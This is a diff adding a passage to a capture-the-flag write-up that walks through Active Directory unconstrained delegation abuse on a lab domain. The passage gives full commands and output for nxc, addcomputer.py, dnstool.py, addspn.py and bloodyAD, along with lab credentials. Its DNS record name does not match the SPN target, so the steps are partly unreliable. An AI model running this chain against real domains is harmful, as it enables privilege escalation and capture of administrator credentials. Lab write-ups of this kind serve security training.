@@ -360,3 +360,113 @@ We can now retrieve the `user.txt` flag:
 
 <br />
 
+This user has interesting privileges:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                                    State
+============================= ============================================================== =======
+SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
+```
+
+<br />
+
+The `SeEnableDelegationPrivilege` is enabled. This privilege in Windows allows a service account to delegate credentials from a client to other services in a domain.
+
+
+# Delegation Abuse
+
+<br />
+
+The attack is divided into three phases, let's go with the first one.
+
+<br />
+
+## Check MachineAccountQuota 
+
+<br />
+
+Since MachineAccountQuota was set to its default value of 10, it was possible to create a new computer account and abuse delegation to continue the attack.
+
+This value can be extracted by running the Netexec `maq` module:
+
+<br />
+
+```bash
+❯ nxc ldap delegate.vl -u a.briggs -p 'P4ssw0rd1#123' -M maq
+LDAP        10.129.34.106   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.34.106   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
+MAQ         10.129.34.106   389    DC1              [*] Getting the MachineAccountQuota
+MAQ         10.129.34.106   389    DC1              MachineAccountQuota: 10
+```
+
+<br />
+
+## Host Setup
+
+<br />
+
+Now, we need to setup the host where we will capture the Administrator authentication.
+
+First, we create the DNS record (a fake host to trick the target machine):
+
+<br />
+
+```bash
+❯ addcomputer.py -computer-name theredp4nther -computer-pass 'Red123!' -dc-ip 10.129.34.106 delegate.vl/N.Thompson:'KALEB_2341'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account theredp4nther$ with password Red123!.
+```
+
+<br />
+
+Then, we add this DNS record:
+
+<br />
+
+```bash
+❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record oxdf.delegate.vl --data 10.10.14.235 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+<br />
+
+The dns records was sucessfully added. Let's assign a SPN to this record:
+
+<br />
+
+```bash
+❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/theredp4nther.delegate.vl' -t 'theredp4nther$' -dc-ip 10.129.34.106 dc1.delegate.vl --additional
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+```
+
+<br />
+
+It worked. Finally, we set the unconstrained delegation to the host:
+
+<br />
+
+```bash
+❯ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'theredp4nther$' -f TRUSTED_FOR_DELEGATION
+[+] ['TRUSTED_FOR_DELEGATION'] property flags added to theredp4nther$'s userAccountControl
+```
+
+<br />
